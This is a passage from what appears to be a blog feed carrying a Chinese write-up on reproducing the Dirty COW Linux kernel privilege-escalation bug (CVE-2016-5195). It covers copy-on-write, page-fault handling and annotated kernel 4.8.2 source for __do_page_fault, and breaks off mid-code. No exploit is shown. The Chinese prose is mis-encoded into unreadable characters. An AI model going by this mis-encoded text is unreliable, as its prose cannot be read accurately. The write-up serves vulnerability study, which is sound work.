blog</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2016-5195(Dirty Cow) Remake</title>
    <link href="/2024/02/27/dirtycow/"/>
    <url>/2024/02/27/dirtycow/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰</h1><p>æŠŠA3ğŸ‘´çš„kernel â… å’Œkernel â…¡è¿½å®Œäº†</p><p>åº·åº·èƒ½ä¸èƒ½å¤ç°ä¸€äº›kernel CVE</p><h1 id="0x01ï¼šä¿¡æ¯æ”¶é›†"><a href="#0x01ï¼šä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01ï¼šä¿¡æ¯æ”¶é›†"></a>0x01ï¼šä¿¡æ¯æ”¶é›†</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-5195">NVD - CVE-2016-5195 (nist.gov)</a></p><p>2016å¹´10æœˆ18æ—¥ï¼Œé»‘å®¢<code>Phil Oester</code>æäº¤äº†éšè—é•¿è¾¾9å¹´ä¹‹ä¹…çš„â€œè„ç‰›æ¼æ´ï¼ˆ<strong>Dirty COW</strong>ï¼‰â€0dayæ¼æ´ã€‚è¯¥æ¼æ´è¡¨æ˜<code>Linux</code>å†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆ<strong>Copy-on-Write</strong>)æ—¶å­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå¯¼è‡´å¯ä»¥ç ´åç§æœ‰åªè¯»å†…å­˜æ˜ å°„ã€‚é»‘å®¢å¯ä»¥è·å–ä½æƒé™çš„æœ¬åœ°ç”¨æˆ·åï¼Œåˆ©ç”¨æ­¤æ¼æ´è·å–å…¶ä»–åªè¯»å†…å­˜æ˜ å°„çš„å†™æƒé™ï¼Œè¿›ä¸€æ­¥è·å–rootæƒé™ã€‚</p><p><strong>Dirty Cow</strong>åœ¨2.xåˆ°4.8.2åŠä»¥ä¸‹çš„<code>version</code>ä¸­éƒ½å¯ä»¥å®Œæˆåˆ©ç”¨ï¼Œä½œç”¨èŒƒå›´ååˆ†å¹¿æ³›ã€‚æœ€åï¼Œæ­¤æ¼æ´ç”±<code>linux</code>åˆ›å§‹äºº<strong>linus</strong>äº²æ‰‹ä¿®å¤</p><h1 id="0x02ï¼šå‰ç½®"><a href="#0x02ï¼šå‰ç½®" class="headerlink" title="0x02ï¼šå‰ç½®"></a>0x02ï¼šå‰ç½®</h1><p><strong>æ–‡ä¸­æ‰€æœ‰çš„æºç å‡ä¸º4.8.2 version</strong></p><h2 id="COWï¼ˆcopy-to-writeï¼‰"><a href="#COWï¼ˆcopy-to-writeï¼‰" class="headerlink" title="COWï¼ˆcopy-to-writeï¼‰"></a>COWï¼ˆcopy-to-writeï¼‰</h2><p>å†™æ—¶å¤åˆ¶ï¼ˆ<strong>Copy-on-Writeï¼ŒCOW</strong>ï¼‰æ˜¯ä¸€ç§è®¡ç®—æœºç¼–ç¨‹ä¸­çš„ä¼˜åŒ–æŠ€æœ¯ï¼Œé€šå¸¸ç”¨äºå¤„ç†å…±äº«æ•°æ®çš„æƒ…å†µã€‚åœ¨ä½¿ç”¨å†™æ—¶å¤åˆ¶æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨å¤šä¸ªå®¢æˆ·ç«¯ï¼ˆæˆ–è€…çº¿ç¨‹ï¼‰å…±äº«åŒä¸€ä»½æ•°æ®çš„æƒ…å†µä¸‹ï¼Œåªæœ‰åœ¨æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä¿®æ”¹æ•°æ®æ—¶æ‰ä¼šå¤åˆ¶æ•°æ®ï¼Œä»¥ç¡®ä¿ä¿®æ”¹æ“ä½œä¸ä¼šå½±å“å…¶ä»–å®¢æˆ·ç«¯ã€‚</p><p>å…·ä½“åˆ°<code>fork()</code>ä¸­æ¥è¯´ï¼Œçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹å…±äº«åŒä¸€ä¸ªé¡µæ¡†ï¼Œåªæœ‰å½“å…¶ä¸­ä¸¤æ–¹ä¸­çš„ä»»æ„ä¸€æ–¹è¯•å›¾ä¿®æ”¹è¯¥é¡µæ¡†ä¸­çš„å†…å®¹æ—¶ï¼Œæ‰ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„é¡µæ¡†ï¼Œå°†åŸå…ˆé¡µæ¡†çš„å†…å®¹<code>copy</code>åˆ°æ–°çš„é¡µæ¡†ï¼Œåœ¨æ–°çš„é¡µæ¡†è¿›è¡Œä¿®æ”¹</p><ul><li><code>fork()</code>æ‰§è¡Œåï¼Œçˆ¶å­è¿›ç¨‹å…±äº«æ‰€æœ‰é¡µæ¡†ï¼Œæ‰€æœ‰é¡µæ¡†è¢«æ ‡è®°ä¸º<code>read-only</code></li><li>å½“è¦ä¿®æ”¹é¡µæ¡†æ—¶ï¼Œå› ä¸ºæ˜¯<code>read-only</code>ï¼Œæ‰€ä»¥ä¼šè§¦å‘<code>page fault</code>ï¼ˆç¼ºé¡µå¼‚å¸¸ï¼‰â€”â€”å†…æ ¸æ‰ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„é¡µæ¡†</li></ul><p>å¤§è‡´æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚åˆ«éª‚äº†åˆ«éª‚äº†çŸ¥é“æˆ‘å­—ä¸‘å‘œå‘œå‘œ:ï¼ˆ</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121649.png" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121717.png" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121748.png" style="zoom:67%;" /><h3 id="mmapä¸COW"><a href="#mmapä¸COW" class="headerlink" title="mmapä¸COW"></a>mmapä¸COW</h3><p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>mmap</code> å°†ä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜æ—¶ï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶å…·æœ‰åªè¯»æƒé™è€Œæ²¡æœ‰å†™æƒé™æ—¶ï¼Œè‹¥æˆ‘ä»¬å°è¯•å‘è¿™ä¸ªæ˜ å°„åŒºåŸŸå†™å…¥æ•°æ®ï¼Œç³»ç»Ÿä¼šå¯åŠ¨å†™æ—¶å¤åˆ¶ï¼ˆ<strong>copy-on-write</strong>ï¼‰æœºåˆ¶ã€‚è¿™ä¼šå¯¼è‡´ç³»ç»Ÿå°†æ–‡ä»¶å†…å®¹çš„å‰¯æœ¬æ‹·è´åˆ°å†…å­˜ä¸­ï¼Œä»¥ä¾¿è¿›ç¨‹å¯ä»¥å¯¹è¿™ä¸ªåŒºåŸŸè¿›è¡Œä¿®æ”¹ï¼Œè€Œä¸ä¼šå½±å“åˆ°ç¡¬ç›˜ä¸ŠåŸå§‹æ–‡ä»¶çš„å†…å®¹ã€‚</p><h2 id="ç¼ºé¡µå¼‚å¸¸-page-fault"><a href="#ç¼ºé¡µå¼‚å¸¸-page-fault" class="headerlink" title="ç¼ºé¡µå¼‚å¸¸ page fault"></a>ç¼ºé¡µå¼‚å¸¸ page fault</h2><p>å½“æ“ä½œç³»ç»Ÿå°è¯•è®¿é—®å­˜å‚¨å™¨ä¸­çš„é¡µé¢ï¼ˆé¡µï¼‰æ—¶ï¼Œå¦‚æœè¯¥é¡µå½“å‰ä¸åœ¨ä¸»å­˜ï¼ˆ<strong>RAM</strong>ï¼‰ä¸­ï¼Œå°±ä¼šå‘ç”Ÿç¼ºé¡µå¼‚å¸¸ï¼ˆ<strong>page fault</strong>ï¼‰ã€‚ç¼ºé¡µå¼‚å¸¸é€šå¸¸æ˜¯ç”±äºä»¥ä¸‹å‡ ç§æƒ…å†µå¼•èµ·çš„ï¼š</p><ol><li><strong>é¡µé¢ä¸åœ¨å†…å­˜ä¸­</strong>ï¼šå½“ç¨‹åºéœ€è¦è®¿é—®ä¸€ä¸ªé¡µé¢ï¼Œè€Œè¯¥é¡µé¢å°šæœªåŠ è½½åˆ°å†…å­˜ä¸­æ—¶ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºé¡µé¢æ›¾ç»åœ¨å†…å­˜ä¸­ï¼Œä½†å·²ç»è¢«æ¢å‡ºåˆ°ç£ç›˜ä¸Šï¼Œæˆ–è€…æ˜¯å› ä¸ºç¨‹åºè®¿é—®äº†ä¸€ä¸ªæ–°çš„é¡µé¢ã€‚</li><li><strong>éæ³•è®¿é—®</strong>ï¼šç¨‹åºå°è¯•è®¿é—®æœªè¢«åˆ†é…ç»™å®ƒçš„å†…å­˜åŒºåŸŸï¼Œæˆ–è€…è®¿é—®å·²ç»è¢«é‡Šæ”¾çš„å†…å­˜åŒºåŸŸã€‚</li><li><strong>é¡µé¢ä¿æŠ¤</strong>ï¼šç¨‹åºå°è¯•å†™å…¥åªè¯»çš„å†…å­˜åŒºåŸŸï¼Œæˆ–è€…æ‰§è¡Œæœªè¢«å…è®¸çš„æ“ä½œã€‚</li></ol><h3 id="å¤„ç†æµç¨‹"><a href="#å¤„ç†æµç¨‹" class="headerlink" title="å¤„ç†æµç¨‹"></a>å¤„ç†æµç¨‹</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__do_page_fault</span>()<br><span class="hljs-built_in">handle_mm_fault</span>()<br><span class="hljs-built_in">__handle_mm_fault</span>()<br><span class="hljs-built_in">handle_pte_fault</span>()<br><span class="hljs-built_in">do_fault</span>()<br><span class="hljs-built_in">do_cow_fault</span>()<br><span class="hljs-built_in">do_wp_page</span>()<br><br></code></pre></td></tr></table></figure><h4 id="do-page-fault"><a href="#do-page-fault" class="headerlink" title="__do_page_fault"></a>__do_page_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This routine handles page faults.  It determines the address,</span><br><span class="hljs-comment"> * and the problem, and then passes it off to one of the appropriate</span><br><span class="hljs-comment"> * routines.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function must have noinline because both callers</span><br><span class="hljs-comment"> * &#123;,trace_&#125;do_page_fault() have notrace on. Having this an actual function</span><br><span class="hljs-comment"> * guarantees there&#x27;s a function trace entry.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> noinline <span class="hljs-type">void</span><br>__do_page_fault(<span class="hljs-keyword">struct</span> pt_regs *regs, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> error_code,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address)<br>    <span class="hljs-comment">/*struct pt_regs *regsï¼šä¿å­˜äº†é¡µé¢é”™è¯¯å‘ç”Ÿæ—¶çš„ CPU å¯„å­˜å™¨çŠ¶æ€ã€‚</span><br><span class="hljs-comment">  unsigned long error_codeï¼šé”™è¯¯ä»£ç ï¼Œç”¨äºæŒ‡ç¤ºé¡µé¢é”™è¯¯çš„ç±»å‹ã€‚</span><br><span class="hljs-comment">  unsigned long addressï¼šå¼•å‘é¡µé¢é”™è¯¯çš„å†…å­˜åœ°å€ã€‚*/</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">tsk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br><span class="hljs-type">int</span> fault, major = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;<br><br>    <span class="hljs-comment">/*ä»å½“å‰ä»»åŠ¡ç»“æ„ä¸­è·å–å†…å­˜ç®¡ç†ç»“æ„ mmï¼Œå¹¶é€šè¿‡è¯¥ç»“æ„æ‰¾åˆ°è§¦å‘é¡µé¢æ•…éšœçš„åœ°å€æ‰€å±çš„å†…å­˜åŒºåŸŸ vma*/</span><br>tsk = current;<br>mm = tsk-&gt;mm;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Detect and handle instructions that would cause a page fault for</span><br><span class="hljs-comment"> * both a tracked kernel page and a userspace page.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (kmemcheck_active(regs))<br>kmemcheck_hide(regs);<br>prefetchw(&amp;mm-&gt;mmap_sem);<br><br><span class="hljs-keyword">if</span> (unlikely(kmmio_fault(regs, address)))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We fault-in kernel-space virtual memory on-demand. The</span><br><span class="hljs-comment"> * &#x27;reference&#x27; page table is init_mm.pgd.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * NOTE! We MUST NOT take any locks for this case. We may</span><br><span class="hljs-comment"> * be in an interrupt or a critical region, and should</span><br><span class="hljs-comment"> * only copy the information from the master page table,</span><br><span class="hljs-comment"> * nothing more.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This verifies that the fault happens in kernel space</span><br><span class="hljs-comment"> * (error_code &amp; 4) == 0, and that the fault was not a</span><br><span class="hljs-comment"> * protection error (error_code &amp; 9) == 0.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;        <span class="hljs-comment">/*æ£€æŸ¥è§¦å‘é¡µé¢æ•…éšœçš„åœ°å€æ˜¯å¦ä½äºå†…æ ¸ç©ºé—´ã€‚ä½†è¿™è¾¹ä¸å¤ªå¯èƒ½å‘ç”Ÿç¼ºé¡µï¼Œæ‰€ä»¥ç”¨unlikelyå®ä¼˜åŒ–ï¼Ÿ*/</span><br><span class="hljs-keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;<span class="hljs-comment">/*ä¸‰ä¸ªæ ‡å¿—ä½ï¼šä½¿ç”¨äº†é¡µè¡¨é¡¹ä¿ç•™çš„æ ‡å¿—ä½ã€ç”¨æˆ·ç©ºé—´é¡µå¼‚å¸¸ã€é¡µä¿æŠ¤å¼‚å¸¸ï¼Œä¸‰ä¸ªæ ‡å¿—ä½éƒ½æ— è¯´æ˜æ˜¯ç”±å†…æ ¸è§¦å‘çš„å†…æ ¸ç©ºé—´çš„ç¼ºé¡µå¼‚å¸¸*/</span><br><span class="hljs-keyword">if</span> (vmalloc_fault(address) &gt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (kmemcheck_fault(regs, address, error_code))<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* Can handle a stale RO-&gt;RW TLB: */</span><br><span class="hljs-keyword">if</span> (spurious_fault(error_code, address))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span><br><span class="hljs-keyword">if</span> (kprobes_fault(regs))<br><span class="hljs-keyword">return</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span><br><span class="hljs-comment"> * fault we could otherwise deadlock:</span><br><span class="hljs-comment"> */</span><br>bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">/*å‘ç”Ÿäº†ä¸€ä¸ªä¸å¯æ¢å¤çš„é¡µé¢æ•…éšœï¼Œç›´æ¥kill*/</span><br><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span><br><span class="hljs-keyword">if</span> (unlikely(kprobes_fault(regs)))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (unlikely(error_code &amp; PF_RSVD))<br>pgtable_bad(regs, error_code, address);<br><br><span class="hljs-keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;<span class="hljs-comment">/*smapï¼Œç›´æ¥gg*/</span><br>bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we&#x27;re in an interrupt, have no user context or are running</span><br><span class="hljs-comment"> * in a region with pagefaults disabled then we must not take the fault</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;<br>bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span><br><span class="hljs-comment"> * vmalloc fault has been handled.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * User-mode registers count as a user access even for any</span><br><span class="hljs-comment"> * potential system fault or CPU buglet:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (user_mode(regs)) &#123; <span class="hljs-comment">/*ç”Ÿç¼ºé¡µå¼‚å¸¸æ—¶çš„å¯„å­˜å™¨çŠ¶æ€ä¸ºç”¨æˆ·æ€ä¸‹çš„*/</span><br>local_irq_enable();<br>error_code |= PF_USER;<br>flags |= FAULT_FLAG_USER;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)<br>local_irq_enable();<br>&#125;<br><br>perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="hljs-number">1</span>, regs, address);<br><br><span class="hljs-keyword">if</span> (error_code &amp; PF_WRITE)<br>flags |= FAULT_FLAG_WRITE;<br><span class="hljs-keyword">if</span> (error_code &amp; PF_INSTR)<br>flags |= FAULT_FLAG_INSTRUCTION;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When running in the kernel we expect faults to occur only to</span><br><span class="hljs-comment"> * addresses in user space.  All other faults represent errors in</span><br><span class="hljs-comment"> * the kernel and should generate an OOPS.  Unfortunately, in the</span><br><span class="hljs-comment"> * case of an erroneous fault occurring in a code path which already</span><br><span class="hljs-comment"> * holds mmap_sem we will deadlock attempting to validate the fault</span><br><span class="hljs-comment"> * against the address space.  Luckily the kernel only validly</span><br><span class="hljs-comment"> * references user space from well defined areas of code, which are</span><br><span class="hljs-comment"> * listed in the exceptions table.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * As the vast majority of faults will be valid we will only perform</span><br><span class="hljs-comment"> * the source reference check when there is a possibility of a</span><br><span class="hljs-comment"> * deadlock. Attempt to lock the address space, if we cannot we then</span><br><span class="hljs-comment"> * validate the source. If this is invalid we can skip the address</span><br><span class="hljs-comment"> * space check, thus avoiding the deadlock:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;<br><span class="hljs-keyword">if</span> ((error_code &amp; PF_USER) == <span class="hljs-number">0</span> &amp;&amp;<br>    !search_exception_tables(regs-&gt;ip)) &#123;<br>bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>retry:<br>down_read(&amp;mm-&gt;mmap_sem);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The above down_read_trylock() might have succeeded in</span><br><span class="hljs-comment"> * which case we&#x27;ll have missed the might_sleep() from</span><br><span class="hljs-comment"> * down_read():</span><br><span class="hljs-comment"> */</span><br>might_sleep();<br>&#125;<br><br>vma = find_vma(mm, address);<br><span class="hljs-keyword">if</span> (unlikely(!vma)) &#123;<br>bad_area(regs, error_code, address);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))<span class="hljs-comment">/*æ£€æŸ¥è§¦å‘é¡µé¢æ•…éšœçš„åœ°å€æ˜¯å¦åœ¨å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„åŒºåŸŸå†…*/</span><br><span class="hljs-keyword">goto</span> good_area;<br><span class="hljs-keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;<br>bad_area(regs, error_code, address);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (error_code &amp; PF_USER) &#123;<span class="hljs-comment">/*ç¼ºé¡µå¼‚å¸¸åœ°å€ä½äºç”¨æˆ·ç©ºé—´*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Accessing the stack below %sp is always a bug.</span><br><span class="hljs-comment"> * The large cushion allows instructions like enter</span><br><span class="hljs-comment"> * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span><br><span class="hljs-comment"> * 32 pointers and then decrements %sp by 65535.)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(address + <span class="hljs-number">65536</span> + <span class="hljs-number">32</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) &lt; regs-&gt;sp)) &#123;<br>bad_area(regs, error_code, address);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;<span class="hljs-comment">/*è°ƒç”¨ expand_stack() å‡½æ•°å°è¯•æ‰©å±•æ ˆåŒº*/</span><br>bad_area(regs, error_code, address);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ok, we have a good vm_area for this memory access, so</span><br><span class="hljs-comment"> * we can handle it..</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*è¿è¡Œåˆ°è¿™é‡Œï¼Œè¯´æ˜æ˜¯æ­£å¸¸çš„ç¼ºé¡µå¼‚å¸¸ï¼Œaddrå±äºè¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œæ­¤æ—¶è¿›è¡Œè¯·æ±‚è°ƒé¡µï¼Œåˆ†é…ç‰©ç†å†…å­˜*/</span><br>good_area:<br><span class="hljs-keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;<br>bad_area_access_error(regs, error_code, address, vma);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If for any reason at all we couldn&#x27;t handle the fault,</span><br><span class="hljs-comment"> * make sure we exit gracefully rather than endlessly redo</span><br><span class="hljs-comment"> * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span><br><span class="hljs-comment"> * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">/*æ ¸å¿ƒfunction*/</span><br>fault = handle_mm_fault(vma, address, flags);<br>major |= fault &amp; VM_FAULT_MAJOR;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we need to retry the mmap_sem has already been released,</span><br><span class="hljs-comment"> * and if there is a fatal signal pending there is no guarantee</span><br><span class="hljs-comment"> * that we made any progress. Handle this case first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;<br><span class="hljs-comment">/* Retry at most once */</span><br><span class="hljs-keyword">if</span> (flags &amp; 